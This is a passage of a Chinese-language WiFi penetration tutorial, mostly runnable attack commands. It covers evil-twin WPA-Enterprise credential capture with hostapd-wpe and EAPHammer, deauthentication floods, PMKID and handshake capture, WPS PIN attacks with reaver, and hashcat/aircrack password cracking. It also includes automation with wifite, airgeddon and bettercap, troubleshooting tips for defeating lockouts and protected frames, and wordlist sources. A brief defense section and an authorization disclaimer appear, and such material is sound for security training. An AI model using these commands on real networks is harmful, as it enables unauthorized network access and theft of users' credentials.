# 使用 hostapd-wpe 或 freeradius-wpe

# 安装
sudo apt install hostapd-wpe -y

# 配置 hostapd-wpe.conf:
interface=wlan1
driver=nl80211
ssid=CorpWiFi
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
dh_file=/etc/hostapd-wpe/certs/dh

# 启动
sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# 捕获的凭证会保存在日志中
# 可以使用 asleap 或 hashcat 破解

# 2. 使用 EAPHammer（更现代的工具）
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
sudo ./kali-setup

# 创建证书
sudo ./eaphammer --cert-wizard

# 启动攻击
sudo ./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid CorpWiFi --creds

# 3. 破解捕获的 MSCHAPv2 哈希
# 使用 asleap
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt

# 使用 hashcat
# 格式: username::::response:challenge
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

### 7.5 PMKID 客户端攻击

针对客户端的 PMKID 攻击。

```bash
# 使用 hcxdumptool 捕获客户端 PMKID
sudo hcxdumptool -i wlan0mon -o client_pmkid.pcapng \
    --enable_status=15 \
    --filterlist_ap=target_ap.txt \
    --filtermode=2

# 转换格式
hcxpcapngtool -o client_hash.hc22000 client_pmkid.pcapng

# 使用 hashcat 破解
hashcat -m 22000 client_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## 8. 自动化工具

### 8.1 Wifite

Wifite 是一个自动化 WiFi 攻击工具，可以自动执行多种攻击。

```bash
# 安装（Kali 已预装）
sudo apt install wifite -y

# 基本使用
sudo wifite

# 指定接口
sudo wifite -i wlan0

# 只攻击 WPA 网络
sudo wifite --wpa

# 只攻击 WEP 网络
sudo wifite --wep

# 只攻击 WPS 网络
sudo wifite --wps

# 指定字典
sudo wifite --dict /usr/share/wordlists/rockyou.txt

# 指定目标
sudo wifite --bssid AA:BB:CC:DD:EE:FF

# 静默模式（不显示详细信息）
sudo wifite --kill

# 跳过某些攻击
sudo wifite --no-wps --no-pmkid

# 设置最小信号强度
sudo wifite --power 50

# 常用组合
sudo wifite -i wlan0 --wpa --dict /usr/share/wordlists/rockyou.txt --kill
```

### 8.2 Airgeddon

Airgeddon 是一个功能丰富的无线安全审计工具。

```bash
# 安装
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh

# 功能包括:
# 1. 接口模式切换
# 2. DoS 攻击
# 3. 握手捕获
# 4. 离线密码破解
# 5. Evil Twin 攻击
# 6. WPS 攻击
# 7. 企业级攻击
# 8. 更多...

# 使用方法:
# 运行后按照菜单选择即可
```

### 8.3 Bettercap

Bettercap 是一个强大的网络攻击和监控工具。

```bash
# 安装
sudo apt install bettercap -y

# 启动
sudo bettercap -iface wlan0mon

# 扫描 WiFi 网络
wifi.recon on

# 显示发现的网络
wifi.show

# 解除认证攻击
wifi.deauth AA:BB:CC:DD:EE:FF

# 捕获握手
wifi.assoc AA:BB:CC:DD:EE:FF

# 使用 caplet（脚本）
sudo bettercap -iface wlan0mon -caplet wifi-recon.cap

# wifi-recon.cap 内容:
# wifi.recon on
# set wifi.show.sort clients desc
# set ticker.commands 'clear; wifi.show'
# ticker on
```

---

## 9. 防御与检测

### 9.1 WiFi 安全最佳实践

```
┌─────────────────────────────────────────────────────────────────────┐
│ WiFi 安全最佳实践                                                    │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ 1. 使用强加密                                                        │
│    • 使用 WPA3（如果设备支持）                                      │
│    • 至少使用 WPA2-AES                                              │
│    • 禁用 WEP 和 TKIP                                               │
│                                                                      │
│ 2. 使用强密码                                                        │
│    • 至少 12 个字符                                                 │
│    • 混合大小写、数字、特殊字符                                     │
│    • 避免字典词汇和常见模式                                         │
│    • 定期更换密码                                                   │
│                                                                      │
│ 3. 禁用 WPS                                                         │
│    • WPS PIN 存在严重漏洞                                           │
│    • 在路由器设置中禁用                                             │
│                                                                      │
│ 4. 隐藏 SSID（有限效果）                                            │
│    • 不能完全隐藏，但增加一点难度                                   │
│    • 客户端探测请求仍会暴露 SSID                                    │
│                                                                      │
│ 5. MAC 地址过滤（有限效果）                                         │
│    • 可以被轻易绕过（MAC 欺骗）                                     │
│    • 作为额外防护层                                                 │
│                                                                      │
│ 6. 启用 PMF（Protected Management Frames）                          │
│    • 防止解除认证攻击                                               │
│    • WPA3 强制要求                                                  │
│                                                                      │
│ 7. 网络分段                                                          │
│    • 访客网络与主网络隔离                                           │
│    • IoT 设备单独网络                                               │
│                                                                      │
│ 8. 监控和日志                                                        │
│    • 监控异常连接                                                   │
│    • 检测解除认证攻击                                               │
│    • 检测伪造 AP                                                    │
│                                                                      │
│ 9. 固件更新                                                          │
│    • 定期更新路由器固件                                             │
│    • 修复已知漏洞                                                   │
│                                                                      │
│ 10. 企业环境                                                         │
│     • 使用 WPA2/WPA3-Enterprise                                     │
│     • 使用 RADIUS 服务器                                            │
│     • 证书认证                                                      │
│     • 802.1X                                                        │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 9.2 检测无线攻击

```bash
# 使用 Kismet 进行无线监控
sudo apt install kismet -y
sudo kismet -c wlan0mon

# Kismet 可以检测:
# - 伪造 AP
# - 解除认证攻击
# - 异常流量
# - 新设备

# 使用 waidps（无线入侵检测）
git clone https://github.com/SYWorks/waidps.git
cd waidps
sudo python waidps.py -i wlan0mon

# 使用 Snort 检测无线攻击
# 需要配置无线相关规则

# 检测解除认证攻击
# 监控大量的解除认证帧
sudo tcpdump -i wlan0mon 'wlan[0] == 0xc0'

# 检测伪造 AP
# 比较 BSSID 和信号强度
# 同一 SSID 不应该有多个 BSSID
```

---

## 10. 实战案例

### 10.1 案例 1: WPA2-PSK 破解

```bash
# 场景: 测试自己的家庭 WiFi 安全性

# 步骤 1: 准备环境
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 步骤 2: 扫描网络
sudo airodump-ng wlan0mon
# 找到目标: MyHomeWiFi, BSSID: AA:BB:CC:DD:EE:FF, Channel: 6

# 步骤 3: 捕获握手
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6 -w home_capture

# 步骤 4: 解除认证攻击（新终端）
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 步骤 5: 确认捕获握手
# airodump-ng 显示 "WPA handshake: AA:BB:CC:DD:EE:FF"

# 步骤 6: 停止捕获，开始破解
# 使用 aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt home_capture-01.cap

# 或使用 hashcat（更快）
hcxpcapngtool -o home.hc22000 home_capture-01.cap
hashcat -m 22000 home.hc22000 /usr/share/wordlists/rockyou.txt

# 结果: 如果密码在字典中，几分钟到几小时内可破解
# 如果密码强度高，可能需要更长时间或无法破解
```

### 10.2 案例 2: PMKID 攻击

```bash
# 场景: 快速测试，不需要等待客户端

# 步骤 1: 准备
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 步骤 2: 使用 hcxdumptool 捕获 PMKID
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=15

# 等待几分钟，观察输出
# 看到 "PMKID" 或 "EAPOL" 表示成功捕获

# 步骤 3: 转换格式
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# 步骤 4: 破解
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# 优势: 不需要客户端，不需要解除认证攻击
```

### 10.3 案例 3: WPS PIN 攻击

```bash
# 场景: 目标启用了 WPS

# 步骤 1: 扫描 WPS 网络
sudo wash -i wlan0mon
# 找到目标: TargetWiFi, BSSID: AA:BB:CC:DD:EE:FF, WPS: 2.0, Lck: No

# 步骤 2: 尝试 Pixie Dust 攻击（快速）
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv

# 如果 Pixie Dust 失败，尝试暴力破解
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 1 -t 1

# 步骤 3: 等待结果
# Pixie Dust: 几秒到几分钟
# 暴力破解: 几小时到几天

# 成功后会显示 WPS PIN 和 WiFi 密码
```

---

## 11. 常见错误与解决

### 11.1 网卡问题

```bash
# 问题 1: 网卡不支持监听模式
# 错误: "Interface doesn't support monitor mode"

# 解决:
# 1. 确认网卡芯片支持监听模式
lsusb  # 查看 USB 网卡
# 2. 安装正确的驱动
# 3. 购买支持的网卡

# 问题 2: 网卡无法启用监听模式
# 错误: "Error setting monitor mode"

# 解决:
# 1. 杀死干扰进程
sudo airmon-ng check kill

# 2. 手动设置
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. 检查 rfkill
rfkill list
sudo rfkill unblock wifi

# 问题 3: 网卡不支持 5GHz
# 解决: 购买双频网卡

# 问题 4: 驱动问题
# 错误: "nl80211 not found"

# 解决:
# 1. 安装驱动
sudo apt install realtek-rtl88xxau-dkms

# 2. 重新加载模块
sudo modprobe -r 88XXau
sudo modprobe 88XXau

# 3. 重启系统
sudo reboot
```

### 11.2 捕获问题

```bash
# 问题 1: 无法捕获握手
# 可能原因:
# - 没有客户端连接
# - 信号太弱
# - 信道不对

# 解决:
# 1. 确认信道正确
sudo airodump-ng wlan0mon --bssid AA:BB:CC:DD:EE:FF -c 6

# 2. 靠近目标 AP
# 3. 使用高增益天线
# 4. 使用解除认证攻击强制重连
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 问题 2: 解除认证攻击无效
# 可能原因:
# - PMF（Protected Management Frames）启用
# - 信号太弱
# - 客户端不在范围内

# 解决:
# 1. 尝试针对特定客户端
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# 2. 使用 mdk4
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# 3. 如果 PMF 启用，尝试 PMKID 攻击

# 问题 3: 捕获文件损坏
# 解决:
# 1. 使用 wireshark 检查
wireshark capture-01.cap

# 2. 使用 aircrack-ng 验证
aircrack-ng capture-01.cap

# 3. 重新捕获
```

### 11.3 破解问题

```bash
# 问题 1: aircrack-ng 显示 "0 handshake"
# 解决:
# 1. 确认捕获了完整握手
# 2. 重新捕获

# 问题 2: hashcat 报错 "No hashes loaded"
# 解决:
# 1. 检查文件格式
file hash.hc22000

# 2. 重新转换
hcxpcapngtool -o hash.hc22000 capture.pcapng

# 3. 检查文件内容
cat hash.hc22000

# 问题 3: 破解速度太慢
# 解决:
# 1. 使用 GPU
hashcat -m 22000 hash.hc22000 dict.txt -d 1

# 2. 使用更好的字典
# 3. 使用规则
hashcat -m 22000 hash.hc22000 dict.txt -r best64.rule

# 4. 使用云破解服务（如 hashtopolis）

# 问题 4: 密码不在字典中
# 解决:
# 1. 使用更大的字典
# 2. 使用规则生成变体
# 3. 使用掩码攻击
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# 4. 使用混合攻击
hashcat -m 22000 hash.hc22000 -a 6 dict.txt ?d?d?d?d
```

### 11.4 其他常见问题

```bash
# 问题 1: "Waiting for beacon frame"
# 原因: 找不到目标 AP
# 解决:
# 1. 确认 BSSID 和信道正确
# 2. 靠近目标
# 3. 检查网卡是否正常工作

# 问题 2: "Fixed channel" 警告
# 原因: 网卡被锁定在某个信道
# 解决:
sudo iwconfig wlan0mon channel 6

# 问题 3: WPS 被锁定
# 原因: 路由器检测到攻击
# 解决:
# 1. 等待一段时间（通常 60 秒到几分钟）
# 2. 使用延迟
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 60 -t 60

# 3. 尝试其他目标

# 问题 4: "EAPOL timeout"
# 原因: 握手超时
# 解决:
# 1. 增加超时时间
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -t 10

# 2. 靠近目标

# 问题 5: 虚拟机中网卡不工作
# 解决:
# 1. 使用 USB 直通
# 2. 在物理机上运行
# 3. 使用 Live USB Kali
```

### 11.5 故障排查清单

```
┌─────────────────────────────────────────────────────────────────────┐
│ WiFi 破解故障排查清单                                                │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ □ 硬件检查                                                          │
│   □ 网卡是否支持监听模式                                            │
│   □ 网卡是否支持数据包注入                                          │
│   □ 驱动是否正确安装                                                │
│   □ 网卡是否被 rfkill 禁用                                          │
│                                                                      │
│ □ 环境检查                                                          │
│   □ 是否杀死了干扰进程 (airmon-ng check kill)                       │
│   □ 监听模式是否启用                                                │
│   □ 信道是否正确                                                    │
│                                                                      │
│ □ 目标检查                                                          │
│   □ BSSID 是否正确                                                  │
│   □ 信号强度是否足够                                                │
│   □ 是否有客户端连接                                                │
│   □ 加密类型是否正确识别                                            │
│                                                                      │
│ □ 捕获检查                                                          │
│   □ 是否捕获到握手/PMKID                                            │
│   □ 捕获文件是否完整                                                │
│   □ 格式转换是否正确                                                │
│                                                                      │
│ □ 破解检查                                                          │
│   □ 字典是否存在                                                    │
│   □ 哈希格式是否正确                                                │
│   □ hashcat 模式是否正确                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 附录

### A. 常用命令速查

```bash
# 监听模式
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airmon-ng stop wlan0mon

# 扫描
sudo airodump-ng wlan0mon
sudo airodump-ng wlan0mon --bssid XX:XX:XX:XX:XX:XX -c 6 -w capture

# 解除认证
sudo aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# 破解
aircrack-ng -w dict.txt capture-01.cap
hashcat -m 22000 hash.hc22000 dict.txt

# 格式转换
hcxpcapngtool -o hash.hc22000 capture.pcapng
```

### B. 推荐字典

```
# Kali 自带
/usr/share/wordlists/rockyou.txt

# SecLists
https://github.com/danielmiessler/SecLists

# 常见 WiFi 密码
https://github.com/kennyn510/wpa2-wordlists

# 生成自定义字典
crunch 8 12 0123456789 -o numbers.txt
```

### C. 参考资源

```
工具文档:
• Aircrack-ng: https://www.aircrack-ng.org/documentation.html
• Hashcat: https://hashcat.net/wiki/
• hcxtools: https://github.com/ZerBea/hcxtools

学习资源:
• WiFi 安全: https://www.wifi-professionals.com/
• Wireless Security: https://www.yourwifisecurity.com/

漏洞研究:
• KRACK: https://www.krackattacks.com/
• Dragonblood: https://wpa3.mathyvanhoef.com/
```

---

> 最后更新: 2025年1月
> 
> 记住：只在获得授权的情况下进行测试。未经授权的 WiFi 破解是违法行为！
